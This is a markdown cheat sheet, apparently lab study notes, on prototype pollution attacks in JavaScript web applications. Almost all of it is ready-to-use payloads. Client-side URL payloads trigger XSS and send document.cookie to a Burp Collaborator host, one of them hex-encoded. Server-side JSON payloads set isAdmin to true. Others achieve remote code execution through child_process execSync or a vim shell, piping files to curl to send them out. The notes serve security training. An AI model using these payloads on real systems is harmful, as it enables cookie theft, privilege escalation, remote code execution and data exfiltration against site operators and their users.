# Prototype Pollution - CHEATSHEET + MOST IMPORTANT LABS

- [PP2toRCE - Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html?highlight=pp2rce#pp2rce-via-env-vars)
- Client side (url) ? -> XSS -> steal cookie
- Server side (json) ? -> burp extension server-side prototype pollution scan ->  escalate privileges / RCE / exfilter data (/home/carlos/morale.txt) 


- [DETECT SERVER SIDE PROTOTYPE POLLUTION](detection-sspp..md) 👁️
- [SERVER SIDE PROTOTYE POLLUTION -  RCE / EXFILTRATE DATA ](sspp-rce-exfiltrar.md) 👁️
 
#### PROTO POC IN URL
```js

// verify with console.log({}.foo)
__proto__.foo=bar
__proto__[foo]=bar 
__pro__proto__to__[foo]=bar
#__proto__[foo]=bar
 

?__proto__[<GADGET>]=alert(1)
?__proto__[<GADGET>]=alert(1)-
?__proto__[<GADGET>]=alert(1)//
#__proto__[<GADGET>]=alert(1)

//jquery
#__proto__.foo=bar 
<script>
    location="https://<IP>>/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>

```

```js
// data in url sintax -> data:[<media-type>][;base64],<data>
?__proto__[transport_url]=data:foo,alert(1)
?__proto__[transport_url]=data:foo,document.location='https://<BURP-COLLAB>/?cookies='+btoa(document.cookie)
?__pro__proto__to__[transport_url]=data:foo,fetch(`https://<BURP-COLLAB>/?cookie=`%2bbtoa(document.cookie));
?__proto__[transport_url]=data:foo,%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%38%64%6d%64%77%68%6b%37%75%77%6b%6e%6e%31%66%73%39%77%78%6d%79%7a%35%77%31%6e%37%65%76%34%6a%74%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%63%6f%6f%6b%69%65%73%3d%27%2b%62%74%6f%61%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29

/?constructor[prototype][value]=data:,fetch(`https://<BURP-COLLAB>`,%20{method:%20‘POST’,mode:%20‘no-cors’,body:document.cookie});


```


#### SERVER SIDE PROTOTYE POLLUTION

```js
// elevate privileges
"__proto__": {"foo": "bar"}
"__proto__": {"status":ERROR 500}
"__proto__": {"isAdmin": true}
```

```js

"constructor": {
 "prototype":{
  "json spaces": 15}
}


"constructor": {
 "prototype":{
  "isAdmin": true}
}
```


RCE
```js

"__proto__":
{"env":{
    "evil":"require('child_process').execSync('cat /home/carlos/morale.txt | base64 | curl -d @- https://<BURP-COLLAB>')//"
},
"NODE_OPTIONS":"--require /proc/self/environ"

}

```

EXFILTRATE DATA
```js

"__proto__":
{   "shell":"vim",
    "input": ":! ls -l /home/carlos/ | base64 | curl -d @- http://<BURP-COLLAB>\n"

}


"__proto__":
{   "shell":"vim",
    "input": ":! cat /home/carlos/morale.txt | base64 | curl -d @- http://<BURP-COLLAB>\n"

}
```



